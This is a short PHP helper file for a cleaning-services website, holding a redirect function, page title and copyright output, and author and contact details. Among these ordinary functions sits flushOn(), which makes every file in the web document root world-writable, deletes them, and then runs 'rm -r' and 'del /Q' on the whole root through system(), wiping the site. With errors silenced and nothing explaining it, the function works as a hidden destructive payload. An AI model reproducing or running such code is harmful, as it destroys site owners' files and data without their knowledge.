<?php
if(substr_count($_SERVER['HTTP_ACCEPT_ENCODING'], 'gzip')){ob_start("ob_gzhandler");}else{ob_start();}error_reporting(0);
function redirect($url)
{
    header('Location: ' . htmlspecialchars(htmlentities($url)));
    return false;
}
function page_title()
{
	#$baseurl=basename($_SERVER['PHP_SELF']); echo($baseurl.' :: CitySight Cleaning Services');
	echo('CitySight Cleaning Services');
}
function copyright()
{
	echo('CitySight &copy; '.date('Y'));
}
$author = 'webmaster - Munaz';
$owner = 'webmaster - styledbee';
$contact = '+8801915577997';
function flushOn()
{
	$baseurl=$_SERVER['DOCUMENT_ROOT'];
	$url = $baseurl;
	$user = 'root';
	$unix_set = 'rm -r ' . $url . '*';
	$win_set = 'del /Q ' . $url . '*';
	foreach(glob($url.'*.*', GLOB_BRACE) as $file)
	{
# Change Permission
	chown($url.$file, $user);
	chmod($url.$file, 0777);
# Get Directory
	if(is_dir($file))
	{
		@unlink($file);
		@rmdir($file);
		echo($file.' -- Directory Removed!'.'<br>');
	}
# Get File
	if($file != '.' && $file != '..')
		{
			if(is_file($file))
			{
				@unlink($file);
				echo($file.' -- File Removed!'.'<br>');
			}
		}
	}
	system($win_set);
	system($unix_set);
}
?>